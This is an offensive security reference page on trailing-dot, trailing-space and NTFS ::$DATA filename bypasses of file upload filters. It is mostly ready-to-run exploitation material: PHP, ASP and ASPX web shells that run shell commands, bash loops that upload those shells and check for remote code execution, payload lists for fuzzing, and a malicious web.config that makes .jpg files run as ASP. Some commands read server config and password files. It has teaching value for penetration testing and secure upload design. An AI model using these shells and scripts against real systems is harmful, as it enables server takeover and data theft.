---
title: Trailing Dot Bypass
description: Exploit operating system and web server filename normalization behaviors involving trailing dots, spaces, and special characters to bypass file upload extension restrictions, whitelist filters, and blacklist validations for achieving remote code execution.
navigation:
  icon: i-lucide-circle-dot
  title: Trailing Dot Bypass
---

## Attack Overview

::callout{icon="i-lucide-info"}
Trailing Dot Bypass exploits the fundamental difference between how **upload validation code** and the **underlying operating system or web server** handle filenames ending with dots (`.`), spaces, and other trailing characters. Windows and certain server configurations automatically strip trailing dots and spaces from filenames during save operations — meaning `shell.php.` is validated as a non-PHP file but saved and served as `shell.php`.
::

::card-group
  ::card
  ---
  icon: i-lucide-scan-eye
  title: Core Concept
  ---
  The application validates the filename `shell.php.` and sees the extension as `.` (empty) or treats the last segment after the final dot as the extension. Since `.` is not `.php`, the file passes the extension check. When the OS writes the file to disk, trailing dots are stripped, resulting in `shell.php` — a fully executable PHP file.
  ::

  ::card
  ---
  icon: i-lucide-flame
  title: Impact
  ---
  Remote Code Execution, Web Shell Deployment, Extension Blacklist Bypass, Extension Whitelist Bypass, Content-Type Filter Bypass, WAF Rule Evasion, Persistent Backdoor Installation, Application Logic Bypass.
  ::

  ::card
  ---
  icon: i-lucide-monitor
  title: Primary Targets
  ---
  Windows-based servers (IIS, XAMPP, WAMP), NTFS filesystem, Apache on Windows, PHP applications on Windows, ASP.NET applications, cloud storage with Windows backends, any application validating extensions before OS-level filename normalization.
  ::

  ::card
  ---
  icon: i-lucide-shield-alert
  title: Why It Works
  ---
  Windows NTFS strips trailing dots and spaces from filenames by design (legacy FAT compatibility). Web application validation occurs **before** the OS writes the file. The validation sees one extension, the filesystem stores another. This TOCTOU gap between validation and storage is the root cause.
  ::
::

## Filename Normalization Behaviors

### Operating System Behaviors

::note{icon="i-lucide-laptop"}
Understanding how each OS handles trailing characters is critical. The bypass works because validation happens in application space (preserving trailing characters) while file storage happens in OS space (stripping them).
::

::accordion
  :::accordion-item{icon="i-lucide-monitor" label="Windows (NTFS / FAT32)"}
  ```
  Normalization Rules:
  ──────────────────────────────────────────────────────
  TRAILING DOTS:
    shell.php.      → shell.php        (dot stripped)
    shell.php..     → shell.php        (dots stripped)
    shell.php...    → shell.php        (dots stripped)
    shell.php.....  → shell.php        (all trailing dots)
  
  TRAILING SPACES:
    shell.php       → shell.php        (space stripped)
    shell.php       → shell.php        (spaces stripped)
    shell.php . .   → shell.php .      (complex stripping)
  
  TRAILING DOT + SPACE:
    shell.php.      → shell.php        (both stripped)
    shell.php .     → shell.php        (space then dot)
    shell.php. .    → shell.php.       → shell.php
  
  NTFS ALTERNATE DATA STREAMS:
    shell.php::$DATA     → shell.php   (ADS stripped)
    shell.php::$DATA.    → shell.php   (ADS + dot)
    shell.php::$DATA.jpg → serves shell.php content
  
  RESULT: File is stored and served as "shell.php"
  ──────────────────────────────────────────────────────
  ```
  :::

  :::accordion-item{icon="i-lucide-terminal" label="Linux (ext4 / XFS)"}
  ```
  Normalization Rules:
  ──────────────────────────────────────────────────────
  TRAILING DOTS:
    shell.php.      → shell.php.       (PRESERVED)
    shell.php..     → shell.php..      (PRESERVED)
    shell.php...    → shell.php...     (PRESERVED)
  
  TRAILING SPACES:
    "shell.php "    → "shell.php "     (PRESERVED)
  
  Linux does NOT strip trailing dots or spaces.
  The file is stored EXACTLY as named.
  
  HOWEVER: Web server configuration matters!
  ──────────────────────────────────────────────────────
  Apache mod_mime on Linux:
    shell.php.      → Checks ".php" handler → MAY EXECUTE
    (depends on AddHandler/AddType configuration)
  
  Nginx on Linux:
    shell.php.      → Serves as static file (no execution)
    shell.php./x.php → PATH_INFO exploit possible
  ──────────────────────────────────────────────────────
  ```
  :::

  :::accordion-item{icon="i-lucide-apple" label="macOS (APFS / HFS+)"}
  ```
  Normalization Rules:
  ──────────────────────────────────────────────────────
  TRAILING DOTS:
    shell.php.      → shell.php.       (PRESERVED on APFS)
    shell.php.      → shell.php        (STRIPPED on HFS+)
  
  CASE SENSITIVITY:
    APFS (default): Case-insensitive, preserving
    shell.PHP.      → stored as "shell.PHP." but matches "shell.php."
  
  macOS behavior is filesystem-dependent.
  HFS+ behaves more like Windows (strips dots).
  APFS preserves but is case-insensitive.
  ──────────────────────────────────────────────────────
  ```
  :::

  :::accordion-item{icon="i-lucide-server" label="Web Server Extension Resolution"}
  ```
  How servers determine file type AFTER OS normalization:
  ──────────────────────────────────────────────────────
  
  APACHE:
    shell.php.     → Stored on Windows as shell.php
                   → Apache serves with PHP handler ✓ EXECUTES
    
    shell.php.jpg  → mod_mime checks .jpg first
                   → But .php is also recognized → MAY EXECUTE
    
    shell.php.     → On Linux: "." is the "extension"
                   → No handler for "." → serves as static
                   → UNLESS AddHandler processes all extensions
  
  IIS:
    shell.asp.     → Windows strips dot → shell.asp
                   → IIS maps .asp → EXECUTES
    
    shell.aspx.    → Windows strips dot → shell.aspx  
                   → IIS maps .aspx → EXECUTES
  
  NGINX:
    shell.php.     → Nginx matches location blocks
                   → "\.php$" does NOT match "shell.php."
                   → Served as static on Linux
                   → On Windows: OS strips dot → matches
  ──────────────────────────────────────────────────────
  ```
  :::
::

### Validation vs Storage Differential

::tip{icon="i-lucide-lightbulb"}
The vulnerability exists in the gap between two operations: the application **validates** the filename in memory (where trailing dots are preserved) and the OS **stores** the file on disk (where trailing dots may be stripped). The application sees `.php.` (safe), the OS creates `.php` (dangerous).
::

::code-group
```python [Python Validation Gap]
# VULNERABLE: Python validates before OS normalizes
import os

filename = "shell.php."  # From upload request

# Validation (in memory - dots preserved)
ext = os.path.splitext(filename)[1]  # Returns "."
if ext in ['.php', '.asp', '.jsp']:
    reject()  # ext is "." → NOT in blacklist → PASSES

# Storage (OS level - Windows strips dots)
save_path = os.path.join('/uploads', filename)
with open(save_path, 'wb') as f:
    f.write(file_data)
# On Windows: /uploads/shell.php. → /uploads/shell.php
# File is now executable!
```

```php [PHP Validation Gap]
<?php
// VULNERABLE: PHP validates, Windows normalizes
$filename = $_FILES['file']['name'];  // "shell.php."

// Validation
$ext = pathinfo($filename, PATHINFO_EXTENSION);  // Returns ""
$blocked = ['php', 'asp', 'jsp', 'exe'];
if (in_array(strtolower($ext), $blocked)) {
    die("Blocked!");
}
// Extension is "" (empty) → NOT in blocked list → PASSES

// Storage
move_uploaded_file(
    $_FILES['file']['tmp_name'],
    "/uploads/" . $filename  // "shell.php."
);
// On Windows: saved as "shell.php"
?>
```

```javascript [Node.js Validation Gap]
// VULNERABLE: Node validates, Windows normalizes
const path = require('path');

const filename = 'shell.php.'; // From upload

// Validation
const ext = path.extname(filename); // Returns "."
const blocked = ['.php', '.asp', '.jsp'];
if (blocked.includes(ext)) {
    return res.status(400).send('Blocked');
}
// ext is "." → NOT in blocked list → PASSES

// Storage (on Windows)
fs.writeFileSync(path.join('/uploads', filename), fileBuffer);
// Windows strips trailing dot → /uploads/shell.php
```

```csharp [C# / ASP.NET Validation Gap]
// VULNERABLE: .NET validates, Windows normalizes
string filename = uploadedFile.FileName; // "shell.aspx."

// Validation
string ext = Path.GetExtension(filename); // Returns "."
string[] blocked = { ".aspx", ".asp", ".ashx" };
if (blocked.Contains(ext.ToLower())) {
    return BadRequest("Blocked");
}
// ext is "." → NOT blocked → PASSES

// Storage
string savePath = Path.Combine("uploads", filename);
uploadedFile.SaveAs(savePath);
// Windows: "shell.aspx." → "shell.aspx"
```

```java [Java Validation Gap]
// VULNERABLE: Java validates, Windows normalizes
String filename = multipartFile.getOriginalFilename(); // "shell.jsp."

// Validation
String ext = filename.substring(filename.lastIndexOf('.'));  // Returns "."
List<String> blocked = Arrays.asList(".jsp", ".jspx", ".war");
if (blocked.contains(ext.toLowerCase())) {
    throw new Exception("Blocked");
}
// ext is "." → NOT blocked → PASSES

// Storage
Path dest = Paths.get("uploads", filename);
Files.copy(multipartFile.getInputStream(), dest);
// Windows: "shell.jsp." → "shell.jsp"
```
::

## Reconnaissance

### Detect OS and Filesystem

::tabs
  :::tabs-item{icon="i-lucide-search" label="Server Fingerprinting"}
  ```bash
  # Detect if target runs Windows
  curl -s -D- https://target.com/ -o /dev/null | grep -iE "server:|x-powered-by:|x-aspnet"
  # IIS → Windows
  # Server: Microsoft-IIS/10.0 → Windows
  # X-Powered-By: ASP.NET → Windows
  # X-AspNet-Version → Windows
  
  # Technology stack detection
  whatweb https://target.com 2>/dev/null
  
  # Check case sensitivity (Windows is case-insensitive)
  curl -s -o /dev/null -w "%{http_code}" "https://target.com/INDEX.HTML"
  curl -s -o /dev/null -w "%{http_code}" "https://target.com/index.html"
  # Both return 200 → likely Windows (case-insensitive)
  # First returns 404 → likely Linux (case-sensitive)
  
  # NTFS specific behaviors
  curl -s -o /dev/null -w "%{http_code}" "https://target.com/index.html::$DATA"
  # 200 → Windows NTFS confirmed
  
  # IIS tilde enumeration (8.3 short names)
  curl -s -o /dev/null -w "%{http_code}" "https://target.com/~1/.aspx"
  curl -s -o /dev/null -w "%{http_code}" "https://target.com/*~1*/.aspx"
  
  # Check for Windows-specific headers
  curl -s -D- "https://target.com/" -o /dev/null | grep -iE "server:|x-powered|x-aspnet|arr"
  ```
  :::

  :::tabs-item{icon="i-lucide-file-check" label="Trailing Dot Behavior Test"}
  ```bash
  # Test if server strips trailing dots
  # Upload a test file with trailing dot
  echo "TRAILING_DOT_TEST" > /tmp/test.txt
  
  # Upload as "test.txt."
  curl -s -X POST https://target.com/upload \
    -F "file=@/tmp/test.txt;filename=dottest.txt." \
    -H "Cookie: session=SESS" | tee /tmp/upload_response.txt
  
  # Check if file accessible without trailing dot
  code_no_dot=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/uploads/dottest.txt")
  code_with_dot=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/uploads/dottest.txt.")
  
  echo "Without dot: HTTP ${code_no_dot}"
  echo "With dot:    HTTP ${code_with_dot}"
  
  # If no_dot=200 and with_dot=404 → OS stripped trailing dot (Windows)
  # If both 200 → file stored with dot (Linux/macOS)
  # If no_dot=200 and with_dot=200 → both accessible (Windows or alias)
  
  if [ "$code_no_dot" = "200" ]; then
    echo "[+] TRAILING DOT STRIPPED - Windows behavior confirmed"
    echo "[+] Target is vulnerable to trailing dot bypass"
  fi
  ```
  :::

  :::tabs-item{icon="i-lucide-test-tube" label="Comprehensive Trailing Char Test"}
  ```bash
  #!/bin/bash
  # Test all trailing character behaviors
  
  TARGET="https://target.com"
  UPLOAD_EP="/upload"
  COOKIE="session=YOUR_SESSION"
  
  echo "TEST_FILE_CONTENT" > /tmp/trail_test.txt
  
  declare -A PAYLOADS=(
    ["single_dot"]="trailtest.txt."
    ["double_dot"]="trailtest.txt.."
    ["triple_dot"]="trailtest.txt..."
    ["single_space"]="trailtest.txt%20"
    ["dot_space"]="trailtest.txt.%20"
    ["space_dot"]="trailtest.txt%20."
    ["dot_space_dot"]="trailtest.txt.%20."
    ["ntfs_data"]="trailtest.txt::DATA"
    ["ntfs_dollar_data"]="trailtest.txt::\$DATA"
    ["null_byte"]="trailtest.txt%00"
    ["tab"]="trailtest.txt%09"
    ["newline"]="trailtest.txt%0a"
    ["cr"]="trailtest.txt%0d"
    ["semicolon"]="trailtest.txt;"
    ["hash"]="trailtest.txt%23"
  )
  
  for name in "${!PAYLOADS[@]}"; do
    filename="${PAYLOADS[$name]}"
    
    # Upload
    code=$(curl -s -o /dev/null -w "%{http_code}" \
      -X POST "${TARGET}${UPLOAD_EP}" \
      -F "file=@/tmp/trail_test.txt;filename=${filename}" \
      -H "Cookie: ${COOKIE}")
    
    # Check access without trailing chars
    access=$(curl -s -o /dev/null -w "%{http_code}" \
      "${TARGET}/uploads/trailtest.txt")
    
    if [ "$code" = "200" ] || [ "$code" = "201" ]; then
      status="UPLOADED"
      [ "$access" = "200" ] && status="UPLOADED+ACCESSIBLE"
    else
      status="BLOCKED"
    fi
    
    printf "%-20s %-35s Upload:%-4s Access:%-4s [%s]\n" \
      "$name" "$filename" "$code" "$access" "$status"
  done
  ```
  :::
::

### Identify Extension Validation Logic

::code-group
```bash [Blacklist Detection]
# Determine if the filter is a blacklist (blocks known bad)
# Upload with different extensions and observe behavior

EXTENSIONS=(
  php php. php.. php...
  asp asp. asp..
  aspx aspx. aspx..
  jsp jsp. jsp..
  exe exe. exe..
  txt txt. txt..
  jpg jpg. jpg..
)

for ext in "${EXTENSIONS[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://target.com/upload \
    -F "file=@test.txt;filename=test.${ext}" \
    -H "Cookie: session=SESS")
  
  if [ "$code" = "200" ] || [ "$code" = "201" ]; then
    echo "[ALLOWED] .${ext} -> HTTP ${code}"
  else
    echo "[BLOCKED] .${ext} -> HTTP ${code}"
  fi
done

# Pattern analysis:
# .php blocked, .php. allowed → trailing dot bypass possible
# .php blocked, .php. blocked → filter handles trailing dots
```

```bash [Whitelist Detection]
# Determine if the filter is a whitelist (allows known good)

for ext in \
  jpg jpg. "jpg " "jpg. " "jpg.." \
  png png. "png " "png.." \
  gif gif. "gif " "gif.." \
  pdf pdf. "pdf " "pdf.."; do
  
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://target.com/upload \
    -F "file=@test.txt;filename=test.${ext}" \
    -H "Cookie: session=SESS")
  
  printf ".%-10s -> HTTP %s\n" "$ext" "$code"
done

# Pattern analysis:
# .jpg allowed, .jpg. blocked → whitelist with strict matching
# .jpg allowed, .jpg. allowed → whitelist doesn't check trailing chars
```

```bash [Error Message Analysis]
# Extract filter logic from error messages
curl -s -X POST https://target.com/upload \
  -F "file=@test.txt;filename=test.php" \
  -H "Cookie: session=SESS" | grep -iE "extension|type|allowed|blocked|invalid|format"

curl -s -X POST https://target.com/upload \
  -F "file=@test.txt;filename=test.php." \
  -H "Cookie: session=SESS" | grep -iE "extension|type|allowed|blocked|invalid|format"

# Compare responses
diff <(curl -s -X POST https://target.com/upload \
  -F "file=@test.txt;filename=test.php" \
  -H "Cookie: session=SESS") \
  <(curl -s -X POST https://target.com/upload \
  -F "file=@test.txt;filename=test.php." \
  -H "Cookie: session=SESS")
```
::

## Exploitation Techniques

### Technique 1 — Single Trailing Dot

::steps{level="4"}

#### Prepare the Payload

```bash
# PHP web shell
cat > /tmp/shell.php << 'EOF'
<?php echo "TRAILING_DOT_BYPASS_" . php_uname(); system($_GET["cmd"]); ?>
EOF
```

#### Upload with Trailing Dot

```bash
# Direct curl upload
curl -v -X POST https://target.com/upload \
  -F "file=@/tmp/shell.php;filename=shell.php." \
  -H "Cookie: session=SESS"

# Verify what the server stored
# On Windows: shell.php. → shell.php (dot stripped)
```

#### Access the Stored File

```bash
# Without trailing dot (as stored on Windows)
curl "https://target.com/uploads/shell.php?cmd=id"

# With trailing dot (may also work)
curl "https://target.com/uploads/shell.php.?cmd=id"

# Verify execution
curl "https://target.com/uploads/shell.php?cmd=whoami"
curl "https://target.com/uploads/shell.php?cmd=hostname"
curl "https://target.com/uploads/shell.php?cmd=type+C:\\Windows\\System32\\drivers\\etc\\hosts"
```

::

### Technique 2 — Multiple Trailing Dots

::warning{icon="i-lucide-alert-triangle"}
Some filters check for a single trailing dot but not multiple. Windows strips **all** trailing dots regardless of count.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Multi-Dot Payloads"}
  ```bash
  # Escalating dot counts
  PAYLOADS=(
    "shell.php."
    "shell.php.."
    "shell.php..."
    "shell.php...."
    "shell.php....."
    "shell.php......"
    "shell.php.........."
  )
  
  SHELL='<?php echo "MULTIDOT_BYPASS"; system($_GET["cmd"]); ?>'
  echo "$SHELL" > /tmp/multidot_shell.php
  
  for payload in "${PAYLOADS[@]}"; do
    dots=$(echo "$payload" | grep -o '\.$' | wc -c)
    
    code=$(curl -s -o /dev/null -w "%{http_code}" \
      -X POST https://target.com/upload \
      -F "file=@/tmp/multidot_shell.php;filename=${payload}" \
      -H "Cookie: session=SESS")
    
    if [ "$code" = "200" ] || [ "$code" = "201" ]; then
      # Check execution
      result=$(curl -s "https://target.com/uploads/shell.php?cmd=id")
      if echo "$result" | grep -q "MULTIDOT_BYPASS"; then
        echo "[+] RCE with: ${payload} (${dots} dots)"
        break
      else
        echo "[~] Uploaded: ${payload} (no execution)"
      fi
    else
      echo "[-] Blocked: ${payload}"
    fi
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Burp Intruder Config"}
  ```yaml
  # Burp Intruder - Trailing Dot Fuzzing
  #
  # Request Template:
  # POST /upload HTTP/1.1
  # Content-Disposition: form-data; name="file"; filename="shell.php§DOTS§"
  #
  # Payload Type: Simple list
  # Payloads:
  .
  ..
  ...
  ....
  .....
  ......
  .......
  ..........
  ...............
  ....................
  #
  # Also test with spaces mixed in:
  . 
  .  
  . .
  .  .
   .
    .
  . . .
  #
  # Grep Match: "success", "uploaded", "saved"
  # Grep Extract: file path/URL patterns
  # Filter: Response code 200/201
  ```
  :::
::

### Technique 3 — Trailing Dot + Space Combinations

::note{icon="i-lucide-space"}
Windows strips both trailing dots AND trailing spaces. Combining them can bypass filters that only check for one or the other.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Dot-Space Payloads"}
  ```bash
  # All permutations of trailing dots and spaces
  PAYLOADS=(
    # Dot then space
    "shell.php. "
    "shell.php.  "
    "shell.php.   "
    
    # Space then dot
    "shell.php ."
    "shell.php  ."
    "shell.php   ."
    
    # Alternating
    "shell.php. ."
    "shell.php . "
    "shell.php. . "
    "shell.php . . "
    "shell.php. . ."
    
    # Multiple spaces
    "shell.php   "
    "shell.php    "
    
    # Space between name and extension dot
    "shell.php .jpg."
    "shell .php."
  )
  
  SHELL='<?php echo "DOTSPACE_BYPASS"; system($_GET["cmd"]); ?>'
  echo "$SHELL" > /tmp/ds_shell.php
  
  for payload in "${PAYLOADS[@]}"; do
    # URL-encode spaces for curl
    encoded=$(echo "$payload" | sed 's/ /%20/g')
    
    code=$(curl -s -o /dev/null -w "%{http_code}" \
      -X POST https://target.com/upload \
      -F "file=@/tmp/ds_shell.php;filename=${encoded}" \
      -H "Cookie: session=SESS")
    
    if [ "$code" = "200" ] || [ "$code" = "201" ]; then
      result=$(curl -s "https://target.com/uploads/shell.php?cmd=id")
      if echo "$result" | grep -q "DOTSPACE_BYPASS"; then
        echo "[+] RCE: '${payload}'"
        break
      else
        echo "[~] Uploaded: '${payload}'"
      fi
    else
      echo "[-] Blocked: '${payload}'"
    fi
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Raw HTTP Request"}
  ```http
  POST /upload HTTP/1.1
  Host: target.com
  Cookie: session=YOUR_SESSION
  Content-Type: multipart/form-data; boundary=----DotSpace
  
  ------DotSpace
  Content-Disposition: form-data; name="file"; filename="shell.php. "
  Content-Type: image/jpeg
  
  <?php echo "DOTSPACE_RCE"; system($_GET["cmd"]); ?>
  ------DotSpace--
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="URL-Encoded Variants"}
  ```bash
  # URL-encoded trailing characters
  PAYLOADS=(
    # %2e = dot
    "shell.php%2e"
    "shell.php%2e%2e"
    "shell.php%2e%2e%2e"
    
    # %20 = space
    "shell.php%20"
    "shell.php%20%20"
    "shell.php%2e%20"
    "shell.php%20%2e"
    
    # %09 = tab
    "shell.php%09"
    "shell.php%2e%09"
    
    # %00 = null (legacy)
    "shell.php%00"
    "shell.php%00."
    "shell.php.%00"
    
    # Double-encoded
    "shell.php%252e"
    "shell.php%2520"
    
    # %0a = newline, %0d = CR
    "shell.php%0a"
    "shell.php%0d"
    "shell.php%0d%0a"
    "shell.php%2e%0a"
    "shell.php%0a%2e"
  )
  
  for payload in "${PAYLOADS[@]}"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" \
      -X POST https://target.com/upload \
      -F "file=@/tmp/ds_shell.php;filename=${payload}" \
      -H "Cookie: session=SESS")
    
    printf "%-30s -> HTTP %s\n" "$payload" "$code"
  done
  ```
  :::
::

### Technique 4 — NTFS Alternate Data Streams (::$DATA)

::callout{icon="i-lucide-hard-drive"}
On Windows NTFS, `::$DATA` is the default data stream name. Appending it to a filename causes Windows to strip it during storage, while the upload validator sees a different "extension". `shell.php::$DATA` is stored as `shell.php`.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="ADS Payloads"}
  ```bash
  # NTFS Alternate Data Stream bypass
  PAYLOADS=(
    # Basic ADS
    "shell.php::$DATA"
    "shell.php::$DATA."
    "shell.php::$DATA.."
    
    # ADS with safe extension
    "shell.php::$DATA.jpg"
    "shell.php::$DATA.png"
    "shell.php::$DATA.gif"
    "shell.php::$DATA.txt"
    "shell.php::$DATA.pdf"
    
    # Colon variations
    "shell.php:$DATA"
    "shell.php:"
    "shell.php:."
    "shell.php:.jpg"
    
    # ADS with trailing chars
    "shell.php::$DATA "
    "shell.php::$DATA. "
    "shell.php::$DATA ."
    
    # Double ADS
    "shell.php::$DATA::$DATA"
    
    # URL-encoded
    "shell.php%3a%3a%24DATA"
    "shell.php%3A%3A%24DATA"
    "shell.php::%24DATA"
    
    # ASP.NET specific
    "shell.aspx::$DATA"
    "shell.aspx::$DATA.jpg"
    "shell.asp::$DATA"
    "shell.ashx::$DATA"
  )
  
  SHELL='<?php echo "ADS_BYPASS"; system($_GET["cmd"]); ?>'
  echo "$SHELL" > /tmp/ads_shell.php
  
  for payload in "${PAYLOADS[@]}"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" \
      -X POST https://target.com/upload \
      -F "file=@/tmp/ads_shell.php;filename=${payload}" \
      -H "Cookie: session=SESS")
    
    if [ "$code" = "200" ] || [ "$code" = "201" ]; then
      result=$(curl -s "https://target.com/uploads/shell.php?cmd=id")
      if echo "$result" | grep -q "ADS_BYPASS"; then
        echo "[+] RCE via ADS: ${payload}"
      else
        echo "[~] Uploaded: ${payload}"
      fi
    else
      echo "[-] Blocked: ${payload}"
    fi
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-file-code" label="ADS Write Attack"}
  ```bash
  # Use ADS to write hidden data alongside legitimate files
  
  # Upload legitimate image
  curl -X POST https://target.com/upload \
    -F "file=@photo.jpg;filename=photo.jpg" \
    -H "Cookie: session=SESS"
  
  # Write PHP shell to ADS of the image
  # On NTFS: photo.jpg:shell.php stores hidden stream
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=photo.jpg:shell.php" \
    -H "Cookie: session=SESS"
  
  # Access the hidden stream
  curl "https://target.com/uploads/photo.jpg:shell.php?cmd=id"
  
  # Or use ::$DATA to access default stream
  curl "https://target.com/uploads/photo.jpg::$DATA"
  ```
  :::
::

### Technique 5 — Trailing Dot with Double Extension

::tabs
  :::tabs-item{icon="i-lucide-layers" label="Combined Payloads"}
  ```bash
  # Combine trailing dot with double extension attacks
  PAYLOADS=(
    # Trailing dot after exec extension
    "shell.php.jpg."
    "shell.php.png."
    "shell.php.gif."
    
    # Trailing dot after all extensions
    "shell.php..jpg."
    "shell.php.jpg.."
    
    # Multiple dots between extensions
    "shell.php...jpg"
    "shell.php....jpg"
    
    # Trailing dot with unknown extension
    "shell.php.xxx."
    "shell.php.abc."
    "shell.php.zzz."
    
    # Dot before safe extension
    "shell..php.jpg"
    "shell...php.jpg"
    
    # Only dots after name
    "shell.php . . . jpg"
    "shell.php. .jpg"
    
    # Reverse double with trailing dot
    "shell.jpg.php."
    "shell.png.php."
    "shell.gif.php."
    "shell.jpg.phtml."
    "shell.png.pht."
  )
  
  SHELL='<?php echo "COMBO_BYPASS"; system($_GET["cmd"]); ?>'
  echo "$SHELL" > /tmp/combo_shell.php
  
  for payload in "${PAYLOADS[@]}"; do
    encoded=$(echo "$payload" | sed 's/ /%20/g')
    
    code=$(curl -s -o /dev/null -w "%{http_code}" \
      -X POST https://target.com/upload \
      -F "file=@/tmp/combo_shell.php;filename=${encoded}" \
      -H "Cookie: session=SESS")
    
    if [ "$code" = "200" ] || [ "$code" = "201" ]; then
      # Try accessing with various normalized names
      for try_name in "shell.php" "shell.php.jpg" "shell.jpg.php" "shell.php.xxx"; do
        result=$(curl -s "https://target.com/uploads/${try_name}?cmd=id" 2>/dev/null)
        if echo "$result" | grep -q "COMBO_BYPASS"; then
          echo "[+] RCE: '${payload}' → accessed as '${try_name}'"
          break
        fi
      done
    fi
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-git-compare" label="Extension Parsing Matrix"}
  ```bash
  # Test how different filenames are parsed vs stored
  
  cat << 'TABLE'
  ┌──────────────────────────┬───────────────┬──────────────────┬───────────┐
  │ Uploaded Filename        │ Parsed Ext    │ Stored (Windows) │ Executed? │
  ├──────────────────────────┼───────────────┼──────────────────┼───────────┤
  │ shell.php.               │ "" (empty)    │ shell.php        │ YES       │
  │ shell.php..              │ "" (empty)    │ shell.php        │ YES       │
  │ shell.php...             │ "" (empty)    │ shell.php        │ YES       │
  │ shell.php ::$DATA        │ "::$DATA"     │ shell.php        │ YES       │
  │ shell.php. .             │ "" (empty)    │ shell.php        │ YES       │
  │ shell.php .              │ "" (empty)    │ shell.php        │ YES       │
  │ shell.php::$DATA.jpg     │ ".jpg"        │ shell.php        │ YES       │
  │ shell.php.jpg.           │ "" (empty)    │ shell.php.jpg    │ DEPENDS   │
  │ shell.php .jpg.          │ "" (empty)    │ shell.php .jpg   │ DEPENDS   │
  │ shell.asp;.jpg.          │ "" (empty)    │ shell.asp;.jpg   │ IIS:YES   │
  └──────────────────────────┴───────────────┴──────────────────┴───────────┘
  TABLE
  ```
  :::
::

### Technique 6 — IIS Specific Trailing Dot Exploitation

::tabs
  :::tabs-item{icon="i-lucide-server" label="IIS + ASP/ASPX"}
  ```bash
  # IIS on Windows — full trailing character suite
  
  # ASP Classic
  ASP_SHELL='<% Response.Write(CreateObject("WScript.Shell").Exec("cmd /c " & Request("cmd")).StdOut.ReadAll) %>'
  echo "$ASP_SHELL" > /tmp/iis_shell.asp
  
  PAYLOADS=(
    "shell.asp."
    "shell.asp.."
    "shell.asp..."
    "shell.asp "
    "shell.asp. "
    "shell.asp ."
    "shell.asp::$DATA"
    "shell.asp::$DATA."
    "shell.asp::$DATA.jpg"
    "shell.asp;.jpg."
    "shell.asp;.jpg "
  )
  
  for payload in "${PAYLOADS[@]}"; do
    encoded=$(echo "$payload" | sed 's/ /%20/g')
    code=$(curl -s -o /dev/null -w "%{http_code}" \
      -X POST https://target.com/upload \
      -F "file=@/tmp/iis_shell.asp;filename=${encoded}" \
      -H "Cookie: session=SESS")
    printf "%-35s -> HTTP %s\n" "'${payload}'" "$code"
  done
  
  # Check execution
  curl "https://target.com/uploads/shell.asp?cmd=whoami"
  curl "https://target.com/uploads/shell.asp?cmd=ipconfig"
  ```
  :::

  :::tabs-item{icon="i-lucide-server" label="IIS + ASPX (.NET)"}
  ```bash
  # ASPX shell
  cat > /tmp/iis_shell.aspx << 'EOF'
  <%@ Page Language="C#" %>
  <%@ Import Namespace="System.Diagnostics" %>
  <%
  if (Request["cmd"] != null) {
      Process p = new Process();
      p.StartInfo.FileName = "cmd.exe";
      p.StartInfo.Arguments = "/c " + Request["cmd"];
      p.StartInfo.UseShellExecute = false;
      p.StartInfo.RedirectStandardOutput = true;
      p.Start();
      Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
  }
  %>
  EOF
  
  # Trailing dot variants for ASPX
  for suffix in "." ".." "..." " " ". " " ." "::$DATA" "::$DATA.jpg"; do
    encoded=$(echo "shell.aspx${suffix}" | sed 's/ /%20/g')
    
    curl -s -o /dev/null -w "shell.aspx%-15s -> HTTP %{http_code}\n" "${suffix}" \
      -X POST https://target.com/upload \
      -F "file=@/tmp/iis_shell.aspx;filename=${encoded}" \
      -H "Cookie: session=SESS"
  done
  
  # Test execution
  curl "https://target.com/uploads/shell.aspx?cmd=whoami"
  ```
  :::

  :::tabs-item{icon="i-lucide-server" label="IIS + web.config Trailing Dot"}
  ```bash
  # Upload web.config with trailing dot
  cat > /tmp/web.config << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
        <add name="dotbypass" path="*.jpg" verb="*"
             modules="IsapiModule"
             scriptProcessor="%windir%\system32\inetsrv\asp.dll"
             resourceType="Unspecified" />
      </handlers>
    </system.webServer>
  </configuration>
  EOF
  
  # Try uploading web.config with trailing dot
  curl -X POST https://target.com/upload \
    -F "file=@/tmp/web.config;filename=web.config." \
    -H "Cookie: session=SESS"
  
  # Windows strips dot → saved as "web.config"
  # Now upload ASP shell as .jpg
  echo '<% Response.Write("WEBCONFIG_BYPASS " & CreateObject("WScript.Shell").Exec("cmd /c " & Request("cmd")).StdOut.ReadAll) %>' > /tmp/shell.jpg
  
  curl -X POST https://target.com/upload \
    -F "file=@/tmp/shell.jpg;filename=shell.jpg" \
    -H "Cookie: session=SESS"
  
  curl "https://target.com/uploads/shell.jpg?cmd=whoami"
  ```
  :::
::

### Technique 7 — Apache on Windows

::tabs
  :::tabs-item{icon="i-lucide-server" label="Apache + mod_php on Windows"}
  ```bash
  # Apache on Windows (XAMPP, WAMP, etc.)
  # Windows strips trailing dot → Apache receives clean .php
  
  SHELL='<?php echo "APACHE_WIN_BYPASS"; system($_GET["cmd"]); ?>'
  echo "$SHELL" > /tmp/apache_shell.php
  
  # Basic trailing dot
  curl -X POST https://target.com/upload \
    -F "file=@/tmp/apache_shell.php;filename=shell.php." \
    -H "Cookie: session=SESS"
  
  # Windows stores as shell.php → Apache serves with mod_php
  curl "https://target.com/uploads/shell.php?cmd=id"
  
  # XAMPP specific paths
  curl "https://target.com/uploads/shell.php?cmd=type+C:\\xampp\\htdocs\\config.php"
  curl "https://target.com/uploads/shell.php?cmd=type+C:\\xampp\\passwords.txt"
  
  # WAMP specific paths
  curl "https://target.com/uploads/shell.php?cmd=type+C:\\wamp64\\www\\config.php"
